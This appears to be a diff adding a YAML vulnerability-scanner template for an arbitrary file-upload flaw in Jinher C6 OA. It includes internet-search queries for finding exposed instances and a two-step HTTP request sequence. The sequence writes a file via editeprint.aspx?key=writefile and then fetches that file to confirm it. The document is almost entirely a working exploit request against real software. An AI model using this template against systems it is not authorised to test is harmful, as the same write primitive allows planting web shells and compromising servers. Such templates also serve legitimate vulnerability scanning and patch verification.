@@ -1,0 +1,50 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Jinher-OA"
+    hunter-query: app.name="金和 OA"
+    quake-query: app:"金和OA"
+    zoomeye-query: app:"金和OA"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips:  /C6/4ndex.txt  |  绝对路径  C:\JINHER\C6\4ndex.txt
+
+name: poc-yaml-jinhe-c6-editeprint.aspx-upload
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /C6/Jhsoft.Web.module/eformaspx/editeprint.aspx?key=writefile&filename={{s2}}.txt&designpath=/C6/
+      follow_redirects: false
+      headers:
+        Content-Disposition: attachment; filename="filename.jpg"
+        Content-type: application/x-www-form-urlencoded
+      body: 4ra1n
+    expression: >-
+      response.status == 200 &&  response.body_string.contains("length")
+
+    output:
+      search: |-
+        "(?P<path>.+)/webapps".bsubmatch(response.body)
+      path: search["path"]
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /C6/{{s2}}.txt
+      follow_redirects: false
+      headers: 
+      body:    
+    expression: >-
+      response.status == 200 && response.body_string.contains("4ra1n")
+
+expression: r0() && r1()
